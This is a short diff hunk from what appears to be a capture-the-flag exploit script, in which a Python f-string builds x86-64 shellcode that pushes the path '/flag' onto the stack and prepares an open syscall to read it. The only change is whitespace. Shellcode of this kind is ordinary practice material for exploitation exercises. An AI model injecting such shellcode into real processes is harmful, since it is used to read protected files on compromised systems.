@@ -16,7 +16,7 @@ assembly = f"""
 
 mov rax, SYS_open
 // push the flag string on stack
-mov rcx, 0x{enhex(b"/flag"[::-1])}
+mov rcx, 0x{ enhex( b"/flag"[::-1] ) }
 push rcx
 mov rdi, rsp
 xor rsi, rsi
